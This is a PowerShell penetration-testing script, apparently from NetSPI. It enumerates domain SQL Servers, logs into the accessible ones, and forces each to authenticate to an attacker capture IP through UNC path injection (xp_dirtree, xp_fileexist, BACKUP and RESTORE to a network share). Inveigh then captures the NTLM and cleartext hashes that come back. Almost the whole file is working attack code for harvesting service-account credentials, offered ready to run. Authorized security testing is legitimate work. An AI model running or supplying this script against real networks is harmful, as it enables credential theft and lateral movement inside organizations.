# author: scott sutherland (@_nullbind), NetSPI 2016
# script name: Get-SQLServiceAccountPwHash2.ps1
# requirements: import-module powerupsql.psm1 (https://github.com/nullbind/Powershellery/blob/master/Stable-ish/MSSQL/PowerUpSQL.psm1);import-module invoke-inveigh.ps1;import-module Inveigh-Relay.ps1 (https://github.com/Kevin-Robertson/Inveigh)
# Note: use for alt domain user: runas /noprofile /netonly /user:domain\users powershell.exe
# Example run as domain user: .\Get-SQLServiceAccountPwHash.ps1 -captureip 10.20.2.1
#import-module .\powerupsql.psm1
#import-module .\inveigh.ps1


[CmdletBinding()]
Param(
  [Parameter(Mandatory=$false)]
   [string]$username,
	
   [Parameter(Mandatory=$false)]
   [string]$password,

   [Parameter(Mandatory=$false)]
   [string]$domaincontroller,

   [Parameter(Mandatory=$true)]
   [string]$captureip,

   [Parameter(Mandatory=$false)]
   [int]$timeout = 5
)
 
# Discover SQL Servers on the Domain via LDAP queries for SPN records
Write-output "Testings access to domain sql servers..."
$SQLServerInstances = Get-SQLInstanceDomain -verbose -CheckMgmt -DomainController $domaincontroller -Username $username -Password $password | Get-SQLConnectionTestThreaded -Verbose -Threads 20 
$SQLServerInstancesCount = $SQLServerInstances.count
Write-output "$SQLServerInstancesCount SQL Server instances found"

# Get list of SQL Servers that the provided account can log into
$AccessibleSQLServers = $SQLServerInstances | ? {$_.status -eq "Accessible"}
$AccessibleSQLServersCount = $AccessibleSQLServers.count

# Status user
Write-output "$AccessibleSQLServersCount SQL Server instances can be logged into"
Write-output "Attacking $AccessibleSQLServersCount accessible SQL Server instances..."

# Start sniffing
Invoke-Inveigh -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue | Out-Null 

# Perform unc path injection on each one
$AccessibleSQLServers | 
ForEach-Object{
    
    # Get current instance ip
    $CurrentInstanceComputer = $_.ComputerName
    $CurrentInstanceIP = Resolve-DnsName $CurrentInstanceComputer| select IPaddress -ExpandProperty ipaddress
    $CurrentInstance = $_.Instance        

    # Start unc path injection for each interface
    Write-Output "$CurrentInstance ($CurrentInstanceIP) - Injecting UNC path"

    # Functions executable by the Public role that accept UNC paths
    Get-SQLQuery -Instance $CurrentInstance -Query "xp_dirtree '\\$captureip\file'" | out-null	
    Get-SQLQuery -Instance $CurrentInstance -Query "xp_fileexist '\\$captureip\file'" | out-null	
    Get-SQLQuery -Instance $CurrentInstance -Query "BACKUP DATABASE TESTING TO DISK = '\\$captureip\file'"  | out-null	
    Get-SQLQuery -Instance $CurrentInstance -Query "RESTORE VERIFYONLY FROM DISK = '\\$captureip\file'"  | out-null	
     
    # Sleep to give the SQL Server time to send us hashes :)
    sleep $timeout
 
    # Get hashes
    Write-Output "Checking for captured password hashes"
    Get-InveighCleartext 
    Get-InveighNTLMv1
    Get-InveighNTLMv2
}

# Stop sniffing
Stop-Inveigh | Out-Null 

# Clear memory
Clear-Inveigh | Out-Null 
